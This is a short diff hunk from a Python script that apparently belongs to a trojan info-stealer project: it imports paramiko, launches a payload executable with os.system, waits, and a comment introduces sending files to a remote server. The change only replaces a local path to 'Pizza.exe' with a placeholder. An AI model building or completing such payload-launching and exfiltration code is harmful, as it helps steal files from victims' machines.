@@ -3,7 +3,7 @@ import time
 import paramiko
 
 
-os.system("E:/Github_Projects/Trojan_Info_Stealer/Pizza.exe") #Running the payload 
+os.system("Path_to_Payload") #Running the payload 
 time.sleep(15)
 
 #Sending files to remote server
